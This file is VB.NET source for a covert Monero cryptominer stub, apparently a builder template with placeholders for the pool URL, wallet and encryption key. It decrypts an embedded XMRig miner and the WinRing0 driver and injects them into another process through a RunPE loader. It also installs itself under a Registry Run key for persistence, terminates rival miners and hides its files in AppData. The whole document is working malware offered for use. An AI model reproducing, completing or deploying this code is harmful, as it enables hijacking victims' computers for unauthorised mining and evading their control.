Imports System.Security.Cryptography
Imports Microsoft.Win32
Imports System.Management
Imports System
Imports System.Net.Sockets
Imports Microsoft.VisualBasic
Imports System.Diagnostics
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Collections.Generic
Imports System.Drawing
Imports System.Windows.Forms
Imports System.IO
Imports System.IO.Compression
Imports System.Net
Imports System.Drawing.Drawing2D
Imports System.Drawing.Imaging
Imports System.Threading
Imports System.Security
Imports System.Text

#Const Assembly = False
#Const INS = False
#Const EnableCPU = False
#Const EnableGPU = False
#Const EnableIdle = False
#Const EnableNicehash = False

#If Assembly Then
<Assembly: AssemblyTitle("%Title%")>
<Assembly: AssemblyDescription("%Description%")>
<Assembly: AssemblyCompany("%Company%")>
<Assembly: AssemblyProduct("%Product%")>
<Assembly: AssemblyCopyright("%Copyright%")>
<Assembly: AssemblyTrademark("%Trademark%")>
<Assembly: AssemblyFileVersion("%v1%" & "." & "%v2%" & "." & "%v3%" & "." & "%v4%")>
<Assembly: Guid("%Guid%")>
#End If



Public Class Program
    Public Shared Sub Main()
#If INS Then
                        Install()
#End If
        KillLastProc()
        Initialize()
    End Sub

#If INS Then
    Public Shared Sub Install()
        Thread.Sleep(2 * 1000)
        Try
            If Process.GetCurrentProcess.MainModule.FileName <> PayloadPath Then
                For Each P As Process In Process.GetProcesses
                    Try
                        If P.MainModule.FileName = PayloadPath Then
                            P.Kill()
                        End If
                    Catch : End Try
                Next
                Using Drop As New FileStream(PayloadPath, FileMode.Create)
                    Dim Client As Byte() = File.ReadAllBytes(Process.GetCurrentProcess.MainModule.FileName)
                    Drop.Write(Client, 0, Client.Length)
                End Using
                Thread.Sleep(2 * 1000)
                Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run\").SetValue(Path.GetFileName(PayloadPath), PayloadPath)
                Process.Start(PayloadPath)
                Environment.Exit(0)
            End If
        Catch ex As Exception
        End Try
    End Sub
#End If

    Public Shared Function GetTheResource(ByVal Get_ As String) As Byte()
        Dim MyAssembly As Assembly = Assembly.GetExecutingAssembly()
        Dim MyResource As New Resources.ResourceManager("#ParentRes", MyAssembly)
        Return AES_Decryptor(MyResource.GetObject(Get_))
    End Function

    Public Shared Sub Run(ByVal PL As Byte(), ByVal arg As String, ByVal buffer As Byte())
        'Credits gigajew for RunPE https://github.com/gigajew/WinXRunPE-x86_x64
        Try
            Assembly.Load(PL).GetType("Project1.Program").GetMethod("Load", BindingFlags.Public Or BindingFlags.Static).Invoke(Nothing, New Object() {buffer, "#InjectionDir\#InjectionTarget", arg})
        Catch ex As Exception
        End Try
    End Sub

    Public Shared Sub KillLastProc()
        On Error Resume Next
        Dim objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & Environment.UserDomainName & "\root\cimv2")
        Dim colProcess = objWMIService.ExecQuery("Select * from Win32_Process")
        Dim wmiQuery As String = String.Format("select CommandLine from Win32_Process where Name='{0}'", "#InjectionTarget")
        Dim searcher As Management.ManagementObjectSearcher = New Management.ManagementObjectSearcher(wmiQuery)
        Dim retObjectCollection As Management.ManagementObjectCollection = searcher.Get
        For Each retObject As Object In colProcess
            If retObject.CommandLine.ToString.Contains("--donate-level=") Then
                retObject.Terminate()
            End If
        Next
    End Sub

    Public Shared Sub Initialize()
        Try
            Dim xmr As Byte() = GetTheResource("#xmr")
            Dim winring As Byte() = GetTheResource("#winring")
            Dim baseDir As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\WinCFG\Libs\"
            Dim runString As String = ""

            Try
                System.IO.Directory.CreateDirectory(baseDir)
                My.Computer.FileSystem.WriteAllBytes(baseDir + "WinRing0x64.sys", winring, False)

#If EnableGPU Then
            Dim libs As Byte() = GetTheResource("#libs")
            Using archive As ZipArchive = New ZipArchive(New MemoryStream(libs))
                For Each entry As ZipArchiveEntry In archive.Entries
                    entry.ExtractToFile(Path.Combine(baseDir, entry.FullName), True)
                Next
            End Using
            runString += " --opencl --cuda "
#End If
            Catch ex As Exception
            End Try

#If EnableIdle Then
            runString += " --donate-level=5 "
#Else
            runString += " --donate-level=4 "
#End If

#If EnableNicehash Then
            runString += " --nicehash "
#End If

#If EnableCPU = False Then
            runString += " --no-cpu "
#End If

            'If --donate-level is set to 5 idle mining is enabled if --donate-level is anything other than 5 idle mining is disabled
            Run(GetTheResource("#dll"), runString + " -B --coin=monero --url=#URL --user=#USER --pass=#PWD --cpu-max-threads-hint=#MaxCPU --cuda-bfactor-hint=12 --cuda-bsleep-hint=100 --cuda-loader=" + ControlChars.Quote + baseDir + "ddb64.dll" + ControlChars.Quote, xmr)
        Catch ex As Exception
        End Try
    End Sub

    Public Shared Function AES_Decryptor(ByVal input As Byte()) As Byte()
        Dim AES As New RijndaelManaged
        Dim Hash As New MD5CryptoServiceProvider
        Try
            AES.Key = Hash.ComputeHash(System.Text.Encoding.Default.GetBytes("#KEY"))
            AES.Mode = CipherMode.ECB
            Dim DESDecrypter As ICryptoTransform = AES.CreateDecryptor
            Dim Buffer As Byte() = input
            Return DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
        Catch ex As Exception
        End Try
    End Function

End Class
